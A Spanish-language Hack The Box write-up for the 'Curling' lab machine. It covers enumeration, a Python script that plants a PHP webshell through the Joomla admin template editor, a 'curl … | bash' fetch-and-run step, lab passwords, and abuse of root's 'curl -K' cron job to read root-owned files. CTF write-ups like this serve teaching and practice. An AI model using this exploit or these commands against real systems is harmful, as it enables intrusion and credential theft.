---
title: "HTB write-up: Curling"
date: 2019-03-30T15:52:48-06:00
description: "Esta fue una maquina llena de guiños, no por eso fácil, pero al menos lo suficiente entretenida para seguir en linea recta. Llegar al CMS, ejecutar un RCE, escalar a un usuario y después aprovecharse de un root muy confianzudo."
tags: ["hackthebox", "htb", "boot2root", "pentesting", "joomla", "cronjobs"]
categories: ["htb", "pentesting"]

---

Esta fue una maquina llena de guiños, no por eso fácil, pero al menos lo suficiente entretenida para seguir en linea recta. Llegar al CMS, ejecutar un RCE, escalar a un usuario y después aprovecharse de un root muy confianzudo.
<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![curling image](https://www.hackthebox.eu/storage/avatars/50cbb1d2e9b638140641af95a7582ef6_thumb.png) [curling](https://www.hackthebox.eu/home/machines/profile/160) | [L4mpje](https://www.hackthebox.eu/home/users/profile/29267) | Linux | 10.10.10.150 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-curling/cardinfo.png)


# Port Scanning

Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:

```text
root@laptop:~# nmap -sS -p- --open -v -n 10.10.10.150
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-06 12:23 CST
Initiating Ping Scan at 12:23
Scanning 10.10.10.150 [4 ports]
Completed Ping Scan at 12:23, 0.43s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:23
Scanning 10.10.10.150 [65535 ports]
Discovered open port 22/tcp on 10.10.10.150
Discovered open port 80/tcp on 10.10.10.150
SYN Stealth Scan Timing: About 36.31% done; ETC: 12:25 (0:00:54 remaining)
Completed SYN Stealth Scan at 12:25, 111.07s elapsed (65535 total ports)
Nmap scan report for 10.10.10.150
Host is up (0.23s latency).
Not shown: 62510 closed ports, 3023 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 111.67 seconds
           Raw packets sent: 126700 (5.575MB) | Rcvd: 104758 (4.190MB)
```

- `-sS` para escaneo TCP vía SYN
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Corroboremos con `masscan`:

```text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.150

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-06 18:46:43 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 80/tcp on 10.10.10.150
Discovered open port 22/tcp on 10.10.10.150
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN ):

Como podemos ver los puertos son los mismos, por lo que iniciamos por identificar los servicios nuevamente con `nmap`.

# Services Identification

Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):

```text
root@laptop:~# nmap -p80,22 -sV -sC -n 10.10.10.150
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-06 12:45 CST
Nmap scan report for 10.10.10.150
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds
```

- `-sC` para que ejecute los scripts safe-discovery de nse
- `-sV` para que me traiga el banner del puerto
- `-p80,22` para unicamente los puertos TCP/22 y TCP/80
- `-n` para no ejecutar resoluciones

Como podemos ver por la identificación de servicios, tenemos un servidor ssh y un servidor apache 2.4.29. Más aun sobre el servidor apache tenemos ejecutando un Joomla, por lo que usaremos jooomscan como siguiente etapa.

# Joomscan

```text
xbytemx@laptop:~/git/joomscan$ perl joomscan.pl -u http://10.10.10.150/
    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.10.150/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.8.8

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :
http://10.10.10.150/administrator/components
http://10.10.10.150/administrator/modules
http://10.10.10.150/administrator/templates
http://10.10.10.150/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.10.10.150/administrator/

[+] Checking robots.txt existing
[++] robots.txt is not found

[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/10.10.10.150/
```

Joomscan nos trae información sobre la versión de joomla, así como una evaluación básica sobre información sensible y archivos por defecto. Sigamos a continuación analizando el home.

# httpie to /index.php and follow

Tomando una captura de pantalla de la pagina tenemos lo siguiente:

![www-root](/img/htb-curling/http-root.png)

Realizaremos un httpie hacia la dirección:

```text
xbytemx@laptop:~/htb/curling$ http http://10.10.10.150
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 3882
Content-Type: text/html; charset=utf-8
Date: Mon, 07 Jan 2019 05:28:02 GMT
Expires: Wed, 17 Aug 2005 00:00:00 GMT
Keep-Alive: timeout=5, max=100
Last-Modified: Mon, 07 Jan 2019 05:28:02 GMT
Pragma: no-cache
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: c0548020854924e0aecd05ed9f5b672b=ct1018vvceb7ibn2ke49m0h35e; path=/; HttpOnly
Vary: Accept-Encoding


...
omitted
...
        <!-- Footer -->
        <footer class="footer" role="contentinfo">
                <div class="container">
                        <hr />

                        <p class="pull-right">
                                <a href="#top" id="back-top">
                                        Back to Top                             </a>
                        </p>
                        <p>
                                &copy; 2019 Cewl Curling site!                  </p>
                </div>
        </footer>

</body>
      <!-- secret.txt -->
</html>
```

Omití la parte superior, porque lo interesante se encuentra abajo; un comentario haciendo referencia hacia un archivo `secret.txt` y en el footer, la referencia al comando `cewl`. Analizemos ambos:

# Cewl

Ejecutamos directamente cewl en la dirección y obtendremos la siguiente lista:

```text
xbytemx@laptop:~/htb/curling$ cewl http://10.10.10.150
CeWL 5.4.4.1 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
the
curling
Curling
site
you
and
are
Print
for
Home
Cewl
Uncategorised
The
your
first
post
Begin
Content
User
best
End
Right
Sidebar
Username
Password
Forgot
Details
Written
Super
Category
Published
May
Hits
down
know
its
true
What
object
article
planet
get
sheet
can
feet
droplets
water
ice
from
more
games
Watching
time
There
this
amazing
username
password
Body
Header
You
here
Main
Menu
Login
Form
Remember
Log
Footer
Back
Top
secret
txt
with
end
Good
question
First
let
bit
jargon
playing
surface
called
Sheet
dimensions
vary
but
they
usually
around
long
about
wide
covered
tiny
that
become
cause
stones
curl
deviate
straight
path
These
known
pebble
absolutely
sport
watch
television
particularly
viewers
looking
escape
frantic
faster
bigger
higher
grind
most
televised
basketball
hockey
hyped
feel
like
drinking
Red
Bull
doing
jumping
jacks
makes
want
drink
glass
red
wine
lie
shag
carpet
deliberate
Thoughtful
even
move
very
slowly
players
spend
lot
talking
strategy
nods
quiet
words
encouragement
rarely
there
disagreements
When
comes
team
member
play
their
turn
sliding
stone
moves
elegant
wind
push
off
slide
gentle
release
Such
poise
finesse
Hey
website
Stay
tuned
content
win
Floris
Email
Address
RSS
Atom
email
address
account
will
Next
item
span
Prev
Please
enter
Submit
verification
code
items
leading
row
associated
Your
emailed
file
sent
Once
have
received
able
choose
new
```

Esta la podremos usar posteriormente como input en alguna parte.

# secret.txt

Realizamos un `httpie` directamente hacia el archivo `secret.txt`:

```text
xbytemx@laptop:~/htb/curling$ http http://10.10.10.150/secret.txt
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Length: 17
Content-Type: text/plain
Date: Mon, 07 Jan 2019 05:29:31 GMT
ETag: "11-56cd09966f4a0"
Keep-Alive: timeout=5, max=100
Last-Modified: Tue, 22 May 2018 19:41:06 GMT
Server: Apache/2.4.29 (Ubuntu)

Q3VybGluZzIwMTgh

xbytemx@laptop:~/htb/curling$ http http://10.10.10.150/secret.txt | base64 -d
Curling2018!xbytemx@laptop:~/htb/curling$
```

La salida fue un Base64, por lo que posteriormente lo mande a un _pipe_ para que lo concatene a `base64 -d`. La salida es la frase __Curling2018!__. Esta luce como una contraseña, por lo que la salida de cewl podría revelarnos información sobre el usuario...

# My first post of curling in 2018!

Revisando nuevamente el contenido de la salida de httpie, podemos encontrar que hay un texto que incluye la firma de alguien:

```html
<p>Hey this is the first post on this amazing website! Stay tuned for more amazing content! curling2018 for the win!</p>
<p>- Floris</p>
```

Probemos las credenciales de `floris:Curling2018!`

# Login on jooomla

Ingresamos a `/administrator/index.php`:

![www administrator/index.php](/img/htb-curling/http-administrator-login.png)

Validamos las credenciales:

![www administrator as floris](/img/htb-curling/http-administrator-login-floris.png)

Excelente, ahora hemos ingresado como floris en el joomla. Veamos ahora que tenemos este acceso como podemos ejecutar cosas en el servidor para conseguir una shell remota.

# Uploading a webshell

Como hemos revisado anteriormente, tenemos un joomla 3.8.8. Buscando rápidamente en google _rce joomla 3.8.8_, nos encontraremos con un articulo de [packet storm security](https://packetstormsecurity.com/files/142731/Joomla-3.x-Proof-Of-Concept-Shell-Upload.html) el cual cuenta con una PoC para subir una shell usando el template de Beez3, y cargando una webshell simple de PHP.

El script modificado para funcionar en la maquina es el siguiente:

```python
#!/usr/bin/env python
# joomla_shellup.py - small script to upload shell in Joomla
#
# 02.05.2017, rewrited: 27.05
# -- hint --
# To exploit this "feature" you will need valid credentials.'
# Based on latest (3.6.5-1) version.'
#   Tested also on: 3.7.x


import requests
import re

target = 'http://10.10.10.150'

print '[+] Checking: ' + str(target)

# initGET
session = requests.session()
initlink = target + '/administrator/index.php'

initsend = session.get(initlink)
initresp = initsend.text

find_token = re.compile('<input type="hidden" name="(.*?)" value="1" />')
found_token = re.search(find_token, initresp)

if found_token:
    initToken = found_token.group(1)
    print '[+] Found init token: ' + initToken

    print '[+] Preparing login request'
    data_login = {
        'username':'Floris',
        'passwd':'Curling2018!',
        'lang':'',
        'option':'com_login',
        'task':'login',
        'return':'aW5kZXgucGhw',
        initToken:'1'
    }
    data_link = initlink
    doLogin = session.post(data_link, data=data_login)
    loginResp = doLogin.text

    print '[+] At this stage we should be logged-in as an admin :)'

    uplink = target + '/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA%3D'
    filename = 'jsstrings.php'
    print '[+] File to change: ' + str(filename)

    getnewtoken = session.get(uplink)
    getresptoken = getnewtoken.text

    newToken = re.compile('<input type="hidden" name="(.*?)" value="1" />')
    newFound = re.search(newToken, getresptoken)

    if newFound:
        newOneTok = newFound.group(1)
        print '[+] Grabbing new token from logged-in user: ' + newOneTok

        getjs = target+'/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA%3D'
        getjsreq = session.get(getjs)
        getjsresp = getjsreq.text
        # print getjsresp
        print '[+] Shellname: ' + filename
        shlink = target + '/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA='
        shdata_up = {
            'jform[source]':'<?php system($_GET["x"]);',
            'task':'template.apply',
            newOneTok:'1',
            'jform[extension_id]':'503',
            'jform[filename]':'/'+filename
        }
        shreq = session.post(shlink, data=shdata_up)
        path2shell = '/templates/beez3/jsstrings.php?x=id'
        print '[+] Shell is ready to use: ' + str(path2shell)
        print '[+] Checking:'
        shreq = session.get(target + path2shell)
        shresp = shreq.text

        print shresp

print '\n[+] Module finished.'
```

Ejecutando la poc:

```text
xbytemx@laptop:~/htb/curling$ python shell_uploader.py
[+] Checking: http://10.10.10.150
[+] Found init token: 9a1a9361861f0818bee33a93c029c15d
[+] Preparing login request
[+] At this stage we should be logged-in as an admin :)
[+] File to change: jsstrings.php
[+] Grabbing new token from logged-in user: 8d814181495128ed49b47c57c1d626ce
[+] Shellname: jsstrings.php
[+] Shell is ready to use: /templates/beez3/jsstrings.php?x=id
[+] Checking:
uid=33(www-data) gid=33(www-data) groups=33(www-data)


[+] Module finished.

```

Correcto, hemos podido realizar un RCE sobre el servidor.

# Exploring from RCE

Explorando un poco desde el RCE (en lugar de buscar una reverse shell):

```text
xbytemx@laptop:~/htb/curling$ http "http://10.10.10.150/templates/beez3/jsstrings.php?x=ls%20/home%20-lah"
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 91
Content-Type: text/html; charset=UTF-8
Date: Mon, 07 Jan 2019 05:34:06 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding

total 12K
drwxr-xr-x  3 root   root   4.0K May 22  2018 .
drwxr-xr-x 23 root   root   4.0K May 22  2018 ..
drwxr-xr-x  6 floris floris 4.0K May 22  2018 floris

xbytemx@laptop:~/htb/curling$ http "http://10.10.10.150/templates/beez3/jsstrings.php?x=ls%20/home/floris%20-lah"
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 250
Content-Type: text/html; charset=UTF-8
Date: Mon, 07 Jan 2019 05:34:22 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding

total 44K
drwxr-xr-x 6 floris floris 4.0K May 22  2018 .
drwxr-xr-x 3 root   root   4.0K May 22  2018 ..
lrwxrwxrwx 1 root   root      9 May 22  2018 .bash_history -> /dev/null
-rw-r--r-- 1 floris floris  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 floris floris 3.7K Apr  4  2018 .bashrc
drwx------ 2 floris floris 4.0K May 22  2018 .cache
drwx------ 3 floris floris 4.0K May 22  2018 .gnupg
drwxrwxr-x 3 floris floris 4.0K May 22  2018 .local
-rw-r--r-- 1 floris floris  807 Apr  4  2018 .profile
drwxr-x--- 2 root   floris 4.0K May 22  2018 admin-area
-rw-r--r-- 1 floris floris 1.1K May 22  2018 password_backup
-rw-r----- 1 floris floris   33 May 22  2018 user.txt
```

Ese archivo _password\_backup_ luce bastante sospechoso, veamos su contenido:

# password\_backup

```text
xbytemx@laptop:~/htb/curling$ http http://10.10.10.150/templates/beez3/jsstrings.php?x=cat%20/home/floris/password_backup
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 626
Content-Type: text/html; charset=UTF-8
Date: Mon, 07 Jan 2019 05:25:39 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding

00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

Vamos a salvarlo para trabajarlo offline:

```text
xbytemx@laptop:~/htb/curling$ http http://10.10.10.150/templates/beez3/jsstrings.php?x=cat%20/home/floris/password_backup > password_backup
```

Como podimos ver por la salida del `cat` se trata de una salida de hexdump, por lo que usemos `xxd` para convertirlo a binario y concatenemos con `file` para saber que tenemos por aqui:

```text
xbytemx@laptop:~/htb/curling$ cat password_backup | xxd -r
BZh91AY&SYHAP)ava:4NnT#@%`
"n                         z@i4hdi9hQdh4i5nh*}y.<~x>    sVTzHߢ1V`Fs
  ۇ7j:XdRk )p7۫;9PCYP    HB*     G U@rrE8PHxbytemx@laptop:~/htb/curling$ cat password_backup | xxd -r | file -
/dev/stdin: bzip2 compressed data, block size = 900k
```

Se trata de un archivo comprimido en bzip2, descomprimamos cuanto sea necesario:

```text
xbytemx@laptop:~/htb/curling$ cat password_backup | xxd -r | bunzip2
l[passwordrBZh91AY&SY6Ǎ@@Pt t"dhhOPIS@68ET>P@#I bՃ|3x(*N&Hk1x"{]B@6mxbytemx@laptop:~/htb/curling$ cat password_backup | xxd -r | bunzip2 | file -
/dev/stdin: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix
xbytemx@laptop:~/htb/curling$ cat password_backup | xxd -r | bunzip2 | gunzip | file -
/dev/stdin: bzip2 compressed data, block size = 900k
xbytemx@laptop:~/htb/curling$ cat password_backup | xxd -r | bunzip2 | gunzip | bunzip2 | file -
/dev/stdin: POSIX tar archive (GNU)
xbytemx@laptop:~/htb/curling$ cat password_backup | xxd -r | bunzip2 | gunzip | bunzip2 | tar x
xbytemx@laptop:~/htb/curling$ cat password.txt
5d<wdCbdZu)|hChXll
```

Finalmente, hemos obtenido el contenido de password.txt, veamos si corresponde a las credenciales de floris:

```text
xbytemx@laptop:~/htb/curling$ ssh floris@10.10.10.150
floris@10.10.10.150's password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan  7 06:02:39 UTC 2019

  System load:  0.92              Processes:            209
  Usage of /:   46.2% of 9.78GB   Users logged in:      0
  Memory usage: 20%               IP address for ens33: 10.10.10.150
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 28 17:00:48 2018 from 192.168.1.71
```

Excelente, tenemos las credenciales del usuario en esta maquina.

> creds: floris / 5d\<wdCbdZu)|hChXll

# cat user.txt

```text
floris@curling:~$ ls -lah
total 44K
drwxr-xr-x 6 floris floris 4.0K May 22  2018 .
drwxr-xr-x 3 root   root   4.0K May 22  2018 ..
drwxr-x--- 2 root   floris 4.0K May 22  2018 admin-area
lrwxrwxrwx 1 root   root      9 May 22  2018 .bash_history -> /dev/null
-rw-r--r-- 1 floris floris  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 floris floris 3.7K Apr  4  2018 .bashrc
drwx------ 2 floris floris 4.0K May 22  2018 .cache
drwx------ 3 floris floris 4.0K May 22  2018 .gnupg
drwxrwxr-x 3 floris floris 4.0K May 22  2018 .local
-rw-r--r-- 1 floris floris 1.1K May 22  2018 password_backup
-rw-r--r-- 1 floris floris  807 Apr  4  2018 .profile
-rw-r----- 1 floris floris   33 May 22  2018 user.txt
floris@curling:~$ cat user.txt
```

# Read as root

Comenzamos por realizar una identificación con linenum:

```text
xbytemx@laptop:~/htb/curling$ ssh floris@10.10.10.150 "curl http://10.10.12.67:4001/le.sh | bash" > le.log
floris@10.10.10.150's password:
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 38174  100 38174    0     0  51034      0 --:--:-- --:--:-- --:--:-- 50966
```

Analizando la salida de linenum, no encontraremos una información relevante a la privesc. Sin embargo, revisando aquello en lo que no tenemos permisos, podemos observar que un proceso es ejecutado con los archivos de la carpeta admin-area:

![Cronjobs 2](/img/htb-curling/cronjob2.png)

Este comando se ejecuta cada 60 segundos, según lo que pude ver en `watch -n1 'ps -fea | grep root | grep -v "\["'`

Tenemos luego entonces que root ejecuta cada 60s:

```text
/bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input
```

Esto significa que _input_ es reiniciado cada 60 segundos.

Por lo cual podemos concluir que _input_ debe tener alguna relación importante, por lo que veamos el contenido:

```text
floris@curling:~$ cd admin-area/
floris@curling:~/admin-area$ ls
input  report
floris@curling:~/admin-area$ cat input
url = "http://127.0.0.1"
```

Ese es el contenido que se reinicia, pero no sabemos aun como ese contenido tiene relación, ya que aun no sabemos como este archivo es usado por root o floris. Esto nos lleva a explorar a mayor detalle los procesos que se generan dentro de la maquina, por lo que descargamos _pspy_ para explorar los procesos:

```text
floris@curling:/dev/shm$ wget http://10.10.12.67:4001/pspy64s
--2019-04-02 04:50:55--  http://10.10.12.67:4001/pspy64s
Connecting to 10.10.12.67:4001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 935452 (914K) [application/octet-stream]
Saving to: ‘pspy64s’

pspy64s                           100%[============================================================>] 913.53K   145KB/s    in 10s

2019-04-02 04:51:06 (91.3 KB/s) - ‘pspy64s’ saved [935452/935452]

floris@curling:/dev/shm$ chmod +x pspy64s
 ```

Tras ejecutar pspy y esperar un minuto veremos los cronjobs ejecutados como root:

```text
2019/04/02 04:54:01 CMD: UID=0    PID=6752   | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
2019/04/02 04:54:01 CMD: UID=0    PID=6751   | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
2019/04/02 04:54:01 CMD: UID=0    PID=6750   | sleep 1
2019/04/02 04:54:01 CMD: UID=0    PID=6749   | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input
2019/04/02 04:54:01 CMD: UID=0    PID=6748   | /usr/sbin/CRON -f
2019/04/02 04:54:01 CMD: UID=0    PID=6747   | /usr/sbin/CRON -f
```

Como podemos ver, root ejecuta el archivo _input_ con `curl -K` para generar el archivo _report_.

Espera que el reporte se ejecute correctamente dentro de 60 segundos y reinicia el archivo input.

# root.txt

Ahora que sabemos como funciona los cronjobs de root, podemos realizar unos ajustes ya que la opcion `\-K` recibe como parámetro el archivo de input de configuración, lo cual nos permite controlar algunas opciones como url:

```text
floris@curling:~/admin-area$ echo "url = \"file:///root/root.txt\"\noutput = /dev/shm/.deleteafterread" > input
floris@curling:~/admin-area$ sleep 1 && cat /dev/shm/.deleteafterread && rm /dev/shm/.deleteafterread
```

... We got root flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
